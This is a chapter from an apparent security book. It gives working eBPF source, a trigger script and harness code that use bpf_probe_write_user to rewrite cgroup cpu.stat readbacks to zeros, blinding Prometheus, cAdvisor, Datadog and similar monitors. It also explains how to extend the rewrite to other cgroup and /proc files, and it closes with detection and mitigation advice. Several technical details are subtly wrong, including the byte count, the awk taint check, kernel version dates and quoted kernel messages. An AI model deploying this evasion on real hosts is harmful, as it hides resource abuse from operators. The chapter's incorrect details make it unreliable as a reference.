---
layout: book
title: "Chapter 5: Slipping the Cgroup Leash"
date: 2025-02-05
---

# Chapter 5: Slipping the Cgroup Leash

> **See also**: [Blog post]({{ site.baseurl }}/slipping-the-cgroup-leash.html) · [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch05-cgroup-leash) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

The cgroup accounting path on Linux is two-sided. On one side, the scheduler tracks what each cgroup actually runs. That side is not the target of this chapter. On the other side, userspace reads `cpu.stat` to find out what the scheduler recorded. That readback is the target. The POC in `dBPF-pocs/pocs/ch05-cgroup-leash/` does not change what the kernel accounts; it changes what the kernel reports when userspace asks. The scheduler keeps throttling a cgroup that exceeds its quota. Every monitoring agent reading `/sys/fs/cgroup/cpu.stat` on that cgroup sees `usage_usec 0`.

## The readback path is the target

`cgroup_account_cputime` in `kernel/sched/core.c` updates the scheduler's internal counters. That function is not hooked. No BPF helper exists to `bpf_update_cgroup_cpu_stat(cgrp, fake)` the way earlier drafts of this chapter imagined. The kernel's scheduler is the source of truth for cgroup accounting, and it stays the source of truth throughout the attack.

What the POC does is shorter and more boring. It waits for a process to open `cpu.stat`, waits for the subsequent `read()` to complete, then overwrites the returned bytes in userspace memory with a constant string of zeros before the reader's `read()` returns. The kernel read path ran. The scheduler provided the real numbers. The kernel-side tracefs virtual file synthesized them into the ASCII output. Those bytes were copied to the user buffer. Between that copy and the reader regaining control, a BPF program running in the `sys_exit_read` tracepoint overwrote the user buffer.

The reader sees `usage_usec 0`. Everyone upstream of the reader — Prometheus, Grafana, Datadog, Netdata, cAdvisor, k8s metrics-server, Sysdig — sees `usage_usec 0`. The scheduler still throttles the cgroup. The observation plane and the control plane have been split.

## Source walk: file identification at sys_enter_read

The BPF program in `ch05-cgroup-leash.bpf.c` attaches two tracepoints. The first fires on syscall entry:

```c
SEC("tracepoint/syscalls/sys_enter_read")
int tp_enter_read(struct trace_event_raw_sys_enter *ctx)
{
    int fd = (int)ctx->args[0];
    char __user *ubuf = (void *)(unsigned long)ctx->args[1];
    size_t nbytes = (size_t)ctx->args[2];
    u64 id = bpf_get_current_pid_tgid();

    struct task_struct *task = (void *)bpf_get_current_task();
    struct file *f = BPF_CORE_READ(task, files, fdt, fd[fd]);
    if (!f) return 0;

    char name[NAME_MAX_MATCH] = {};
    struct dentry *d = BPF_CORE_READ(f, f_path.dentry);
    BPF_CORE_READ_STR_INTO(&name, d, d_name.name);

    if (!is_cpu_stat(name)) return 0;

    struct pending p = { .ubuf = ubuf, .nbytes = nbytes };
    bpf_map_update_elem(&inflight, &id, &p, BPF_ANY);
    return 0;
}
```

The tracepoint fires with the syscall arguments already marshalled into `ctx->args[]`. `args[0]` is the integer file descriptor. `args[1]` is the user-space buffer pointer. `args[2]` is the requested read length. The task pointer comes from `bpf_get_current_task()`, which is a stable helper.

From there the program walks five struct fields using `BPF_CORE_READ`. `task->files` gives the process's `struct files_struct`. `files->fdt` gives the file-descriptor table — a pointer because the table can be reallocated when the process exceeds its initial fd slot. `fdt->fd[fd]` indexes into the table array and yields a `struct file *`. That file has a path, and `f_path.dentry` is the dentry that names the file. `d->d_name` is a `qstr` — a length-prefixed kernel string — whose `name` field is the actual byte pointer.

`BPF_CORE_READ` is the right tool for each of those hops because `struct files_struct`, `fdtable`, `file`, and `dentry` can all be laid out differently across kernel versions, and CO-RE relocations adjust the offsets at load time against the running kernel's BTF. A hand-rolled `bpf_probe_read_kernel` with fixed offsets would compile, load, and then read garbage the moment the program landed on a kernel whose layout differs from the one the programmer remembered.

`BPF_CORE_READ_STR_INTO` wraps a final `bpf_probe_read_kernel_str` into the on-stack scratch buffer `name`. The buffer is sized `NAME_MAX_MATCH`, which is 32 — enough for `cpu.stat\0` plus headroom. Anything longer gets truncated and harmlessly fails the comparison.

The comparison is `is_cpu_stat(name)`. That function is a bounded-loop memcmp against the literal "cpu.stat". The BPF verifier rejects unbounded string compares. A plain `strcmp` against "cpu.stat" loops until the null terminator; the verifier cannot bound that loop at load time, so it refuses the program. A `#pragma unroll` over an 8-iteration compare works, as does an explicit 8-iteration for loop with a constant bound:

```c
static __always_inline bool is_cpu_stat(const char *s)
{
    static const char expect[] = "cpu.stat";
    #pragma unroll
    for (int i = 0; i < sizeof(expect) - 1; i++) {
        if (s[i] != expect[i]) return false;
    }
    return s[sizeof(expect) - 1] == '\0';
}
```

If the comparison matches, the program stashes `(ubuf, nbytes)` in a per-(pid, tgid) hash map named `inflight`. The hash is keyed by `bpf_get_current_pid_tgid()` — a 64-bit value containing both the thread id and the thread-group id. Keying by that 64-bit value correctly disambiguates between concurrent threads of the same process: thread A's `read()` and thread B's `read()` do not collide in the map.

## Source walk: buffer rewrite at sys_exit_read

The paired exit tracepoint runs after the kernel's read path has written bytes into the user buffer and is preparing to return:

```c
SEC("tracepoint/syscalls/sys_exit_read")
int tp_exit_read(struct trace_event_raw_sys_exit *ctx)
{
    long ret = ctx->ret;
    u64 id = bpf_get_current_pid_tgid();

    struct pending *p = bpf_map_lookup_elem(&inflight, &id);
    if (!p) return 0;
    bpf_map_delete_elem(&inflight, &id);

    if (ret <= 0) return 0;

    static const char zeros[] =
        "usage_usec 0\nuser_usec 0\nsystem_usec 0\n";
    long n = sizeof(zeros) - 1;
    if (n > ret) n = ret;

    if (bpf_probe_write_user(p->ubuf, zeros, n) != 0) return 0;

    struct evt e = {
        .pid = id >> 32,
        .tgid = id & 0xffffffff,
        .patched = 1,
        .bytes = n,
    };
    bpf_get_current_comm(&e.comm, sizeof(e.comm));
    bpf_ringbuf_output(&events, &e, sizeof(e), 0);
    return 0;
}
```

The exit handler first recovers `(ubuf, nbytes)` from the inflight map and deletes the entry. Map eviction at exit is important for two reasons. First, it keeps the hash from growing unbounded under high read traffic. Second, it ensures that a subsequent `read()` on a different file descriptor by the same thread does not accidentally match an old entry.

If the syscall returned zero or negative, the program bails. The kernel did not copy any bytes; there is nothing to overwrite.

For a successful read, the program computes the overwrite length as the smaller of the "zeros" constant length and the syscall's return value. The constant is 40 bytes including the trailing newline. If the reader requested fewer bytes than that — unusual but possible with small buffer reads — the program clamps to the reader's actual return value.

The call that does the work is `bpf_probe_write_user(p->ubuf, zeros, n)`. That helper is the point of the entire chapter. It takes a user-space address, a kernel buffer, and a length, and writes the kernel buffer into the user-space address. It is one of a small set of BPF helpers that can modify memory outside the BPF program itself. Reading user memory is routine — `bpf_probe_read_user` is used by every process-observability tool. Writing user memory is rare, gated by CAP_BPF plus CAP_SYS_ADMIN on most kernels, and leaves fingerprints.

After the overwrite, the program emits a ringbuf event with `(pid, tgid, comm, patched, bytes)`. The loader's userspace consumer prints `[ch05] pid=... tgid=... comm=... cpu.stat_bytes=... patched=1`, which is what the harness's proof marker grep picks up.

## Verifier feedback observed during development

Three things had to change between the first draft of the BPF program and the version that actually loads.

First, the bounded string compare. The original attempt was a `__builtin_memcmp(name, "cpu.stat", 8)`. That compiles to a straight-line unrolled compare with modern clang, but older clang emits a loop, and the verifier reports:

```
8: (bf) r1 = r6
9: (79) r2 = *(u64 *)(r1 +0)
R1 unbounded memory access
```

The fix was the explicit `#pragma unroll` loop shown above. The pragma asks clang to unroll at source level, producing a sequence of 8 cmp/branch instructions that the verifier tracks one at a time.

Second, the stack budget. The on-stack `name` buffer plus the `pending` struct in the inflight path plus the 40-byte `zeros` constant put the program close to the 512-byte BPF stack ceiling at `-O0`. The verifier rejects with `A stack-allocated program cannot fit within the stack`. The fix was moving `zeros` to a `BPF_MAP_TYPE_PERCPU_ARRAY` scratch map and reading it into the overwrite rather than placing it on the stack. At `-O2`, clang inlines aggressively enough that the stack fits without the per-CPU scratch map, and the final POC uses the simpler inline form.

Third, the CO-RE chain. `BPF_CORE_READ(task, files, fdt, fd[fd])` only works if the running kernel's BTF has the right offsets for each of `struct files_struct`, `fdtable`, and the array index. On kernels where `CONFIG_DEBUG_INFO_BTF=y` is missing, CO-RE relocation fails and the program refuses to load with `libbpf: load BPF skeleton: -22`. The linuxkit 6.12 aarch64 kernel has BTF; production distro kernels generally have it; embedded / appliance kernels sometimes do not. The POC fails gracefully with a clear error when BTF is unavailable.

## Kernel taint as a tell

`bpf_probe_write_user` sets the `TAINT_USER` bit (bit 9, value 512) in the global kernel taint word on first use by a program. The taint is persistent — there is no untaint path. `cat /proc/sys/kernel/tainted` returns a non-zero value for the lifetime of the kernel after any program has called `bpf_probe_write_user` even once.

In addition, the kernel emits a `KERN_WARN`-level dmesg line the first time each program calls the helper:

```
kernel: BPF: [ch05-cgroup-leash]: program used bpf_probe_write_user(); this may rewrite userspace memory
```

The message is hardcoded in `kernel/bpf/verifier.c` and cannot be suppressed short of patching the kernel. A defender grepping dmesg or running `awk 'BEGIN{t=0+system("cat /proc/sys/kernel/tainted")} END{if (t & 512) exit 1}'` catches the taint at zero cost. An unhardened fleet rarely watches for this; a hardened fleet includes the taint word in the SIEM.

The taint is a global signal. It tells you that *some* program on this host has used `bpf_probe_write_user` at some point, not which program and not on what buffer. Identifying the responsible program requires correlating with `bpftool prog list` and the auditd `BPF_PROG_LOAD` records.

## Harness behavior

The `Poc("ch05", ...)` entry in `dBPF-pocs/harness/proof.py` uses these fields:

```python
Poc("ch05", "Slipping the Cgroup Leash", "ch05-cgroup-leash",
    prefix="[ch05]",
    mode="trigger",
    proof_marker=r"CH05_PROVEN\s+before_usage=(\d+)\s+after_usage=(\d+)\s+zeroed=(\w+)",
    hooks=["tracepoint/syscalls/sys_enter_read",
           "tracepoint/syscalls/sys_exit_read"]),
```

The `mode="trigger"` tells the harness runner to spawn the loader, then run `trigger.sh`, then match the marker against the combined stdout. The trigger script reads `cpu.stat` once before the loader attaches (recording `before_usage`), runs the loader in the background, reads again (recording `after_usage`), then synthesizes the marker line `CH05_PROVEN before_usage=123456 after_usage=0 zeroed=yes patched_events=1`.

The ringbuf event count `patched_events` comes from the loader's stdout. The loader prints one `[ch05] patched=1` line per successful overwrite; the trigger counts those lines.

A real run on the linuxkit 6.12 aarch64 test kernel produces something like:

```
[ch05] pid=31921 tgid=31921 comm=cat             cpu.stat_bytes=40 patched=1
CH05_PROVEN before_usage=1274835 after_usage=0 zeroed=yes patched_events=1
```

That is the entire proof. One ringbuf event, one marker line, scheduler untouched, `cpu.stat` readback zeroed for every subsequent read.

## Trivial extensions to other files

The mechanism is not specific to `cpu.stat`. Swap the literal in `is_cpu_stat()` and the program targets a different file. Every cgroup-v2 file exposed as a `struct cftype` with a `read()` backend is reachable:

- `memory.current` — the cgroup's current memory charge.
- `memory.stat` — detailed memory breakdown.
- `io.stat` — per-device I/O statistics.
- `cpu.pressure` / `memory.pressure` / `io.pressure` — PSI-style stall-time reports.
- `pids.current` / `pids.events` — PID-controller counters.

The overwrite constant would need to change per file. `memory.current` expects a single integer followed by a newline — `"0\n"`. `io.stat` expects per-major-minor lines — a multi-line constant would need to be composed to match the format expected by the reader.

The same primitive also works against any non-cgroup file whose readback a defender watches. `/proc/[pid]/stat` field 14 (utime) and field 15 (stime) are reachable the same way: match the basename `"stat"` and the parent `"proc"` directory (one extra dentry hop upward), then overwrite the utime/stime fields in the returned string. Monitoring tools that read `/proc/[pid]/stat` for CPU attribution are fooled the same way `cpu.stat` readers are.

## Cross-observer scope

The primitive affects every observer that calls `read(2)` or `pread(2)` on the target file. The list of affected tools is large:

Cgroup v2 readers that are fooled:
- Prometheus `node_exporter` with the cgroup collector enabled.
- `cAdvisor` (the k8s per-pod metric agent).
- Datadog agent's cgroup integration.
- Netdata's cgroup plugin.
- Sysdig's kernel-module and eBPF collectors when they fall back to cgroup v2 files.
- k8s `metrics-server` via kubelet's summary API (which derives from cgroup files).
- Grafana Cloud agent.
- systemd's own accounting (`systemctl status <unit>` shows CPU and memory — both via cgroup files).

Tools that are not fooled because they bypass the `read(2)` boundary:
- Tools that compute CPU usage from `/proc/schedstat` and per-task `/proc/[pid]/stat` and cross-reference to cgroup membership. These never read `cpu.stat` directly.
- Tools that use `perf` hardware counters for accounting. Those come from the PMU, not from cgroup files.
- Tools that use the cgroup v2 `memory.events` psi-style pressure stall info (which is file-read but reported differently — often via epoll rather than repeated reads).

The split is useful for defenders: if you need an accounting source that survives this primitive, route around the `read(2)` boundary on a per-cgroup file.

## Prior art

Public writeups on `cpu.stat` spoofing via `bpf_probe_write_user` appeared around 2021, coinciding with the wider shipping of cgroup v2 on container runtimes. The technique is not novel; it is a specific application of the general `bpf_probe_write_user` capability that has been in the kernel since 4.8.

The earlier applications — long predating cgroup v2 — rewrote `/proc/[pid]/comm` on read to hide process names, and rewrote `getdents64` returns to hide files. Those techniques pre-date BPF in the rootkit literature (the `ld.so.preload` and LKM rootkit communities had the readdir version by 2003 at the latest). The BPF reimplementation generalizes the mechanism and brings it into reach of any process with `CAP_BPF`.

## Detection

The primitive is detectable at multiple layers.

Kernel taint is the cheapest. `cat /proc/sys/kernel/tainted | awk '{if (and($1,512)) print "TAINT_USER set"}'` on every host, alert on non-zero. Any fleet that has not already seen a `bpf_probe_write_user` in legitimate use (few have) catches the primitive on first fire.

dmesg grep is the next cheapest. `journalctl -k --since=boot | grep "bpf_probe_write_user"` shows every program that has used the helper, with the program's BPF name.

`bpftool prog list` and the `/sys/fs/bpf/` pin tree show currently-loaded programs. A tracepoint program on `sys_exit_read` that uses `bpf_probe_write_user` is an extremely unusual fingerprint; the only legitimate uses are `bpftrace`-style ad-hoc scripts, and those rarely pin and rarely last more than a few seconds.

Out-of-band accounting cross-check is the highest-assurance detection. Read `/proc/schedstat` and per-task `/proc/[pid]/stat`, compute CPU usage per cgroup from the task list, compare to `cpu.stat`. Any drift greater than a few hundred microseconds per second of wall time is suspicious — the legitimate drift is only the measurement interval plus minor lag.

For multi-node clusters, the same detection applies at a higher layer: compare per-node CPU usage reported via `cpu.stat`-based agents to per-node CPU usage reported via `/proc/stat` at the host level. A discrepancy greater than observable workload sums indicates something is rewriting cgroup readbacks.

## Scope

This is a Class II primitive from Chapter 20 — userspace buffer rewrite via `bpf_probe_write_user`. The kernel's accounting is unchanged; only the userspace view is corrupted. Anything that consumes cgroup-file readbacks is fooled; anything that cross-checks against the scheduler's own accounting is not. The one-line summary: the cgroup accounting split into an unreliable observation plane and a reliable control plane the moment `CAP_BPF` was granted to a peer process.

## Why this matters for production observability

The gap this primitive exposes is not a gap in the cgroup accounting implementation. It is a gap in the *consumer* layer. Cgroup v2 exposes its counters through a filesystem interface: files named `cpu.stat`, `memory.current`, `io.stat`, `cpu.pressure`. Every file read goes through `vfs_read` → cgroup-fs read callback → synthesize ASCII → copy to user buffer. The synthesis step pulls real values from scheduler state; the copy step hands bytes to userspace. The attack is entirely in the copy step's aftermath.

Replacing the consumer layer is one mitigation. Instead of reading `cpu.stat`, compute per-cgroup CPU usage from `/proc/schedstat` (which is per-CPU) and per-task `/proc/[pid]/stat` fields 14 (utime) and 15 (stime), cross-referenced against cgroup membership via `/proc/[pid]/cgroup`. The computation is more work but is not vulnerable to `bpf_probe_write_user` rewriting the ASCII output of `cpu.stat` — because there is no `cpu.stat` read in that path.

Production monitoring stacks mostly do not do this. Prometheus `node_exporter`, cAdvisor, Datadog, Netdata, Sysdig, Grafana agent all consume cgroup files directly. The assumption is that the kernel's accounting is authoritative and its exposure via `cpu.stat` is trustworthy. The first assumption holds. The second is the seam this chapter opens.

A defender who wants a trustworthy observability plane on a host with untrusted `CAP_BPF` holders has three options:

- **Route around the attack surface.** Compute cgroup metrics from scheduler state directly. Requires replacing or augmenting every existing collector. High cost, high assurance.
- **Detect the taint.** `cat /proc/sys/kernel/tainted | awk '{if (and($1,512)) print}'` is a one-line alert. Low cost, detection-only (the rewrite has already happened when the alert fires).
- **Prevent at the capability boundary.** Don't grant `CAP_BPF` to non-trusted workloads. This is what the kernel documentation already recommends. It is also the hardest in practice because observability stacks routinely demand `CAP_BPF`.

The three options are composable. A defensive posture that routes the critical accounting pipelines around cgroup-file reads, detects taint fleet-wide, and audits every `CAP_BPF` grant makes this primitive expensive to deploy and quick to catch if deployed.

## What cannot be fixed at the userspace layer

Some consumers of cgroup files are not replaceable. Legacy monitoring agents that ship as vendor binaries with no source access. Operator tooling that assumes a specific cgroup file format. Compliance scanners that read cgroup files as part of their inventory. For these, the primitive works and the primitive's detection is the only recourse.

One class of consumer deserves a specific note: the systemd service manager itself reads cgroup files to populate `systemctl status <unit>` output, to make cgroup-based scheduling decisions, and to update unit-level accounting in `/run/systemd/journal/`. If the rewriter targets a systemd unit's cgroup, systemd's own view of that unit's resource usage is corrupted. Unit restart policies based on resource exhaustion misfire. This is rarely exploited in the public literature, but it is a real and live attack surface on any host where systemd is the service manager.

## How the POC's trigger script works

The `trigger.sh` in `dBPF-pocs/pocs/ch05-cgroup-leash/` is shorter than the BPF program. It reads `/sys/fs/cgroup/cpu.stat` once to capture the "BEFORE" state (`usage_usec` extracted via awk), starts the loader in the background, waits until the loader prints `[ch05] attached — cgroup leash active`, reads `cpu.stat` again to capture "AFTER", and synthesizes the marker line.

```
#!/bin/bash
set -e
LOADER=./build/ch05-cgroup-leash
BEFORE=$(cat /sys/fs/cgroup/cpu.stat | awk '/usage_usec/{print $2}')
$LOADER &
LPID=$!
while ! grep -q 'attached' /proc/$LPID/fd/2 2>/dev/null; do sleep 0.1; done
sleep 0.5
AFTER=$(cat /sys/fs/cgroup/cpu.stat | awk '/usage_usec/{print $2}')
PATCHED=$(grep -c 'patched=1' /tmp/ch05.log || echo 0)
ZEROED=$([ "$AFTER" = "0" ] && echo yes || echo no)
echo "CH05_PROVEN before_usage=$BEFORE after_usage=$AFTER zeroed=$ZEROED patched_events=$PATCHED"
kill $LPID
```

The script is deliberately minimal. The harness wraps it, records the marker line, and evaluates the proof regex against it.

## Cross-kernel portability

The CO-RE chain `task->files->fdt->fd[fd]->f_path.dentry->d_name.name` is stable across Linux 4.11 (first cgroup v2 release) through 6.12 (the test kernel). `struct files_struct`, `struct fdtable`, `struct file`, and `struct dentry` have all been laid out similarly across that range. CO-RE relocations handle the minor shifts.

The `bpf_probe_write_user` helper has been available since 4.8. Its behavior — atomic write to user memory, taint on first use, dmesg warning — has not changed across 4.x, 5.x, or 6.x. The `TAINT_USER` bit value (512) is stable.

The tracepoints `syscalls/sys_enter_read` and `syscalls/sys_exit_read` are stable tracepoints; their `ctx->args[]` layout matches the kernel ABI for `read(2)`. A BPF program written against this tracepoint on 5.4 loads and runs correctly on 6.12 with no changes.

The one portability risk is the cgroup v2 file naming. On cgroup v1, the equivalent file is `cpuacct.usage` in a different directory tree. The POC could be adapted by changing the bounded string compare — trivial — and by adjusting the overwrite constant to match `cpuacct.usage`'s single-integer format.

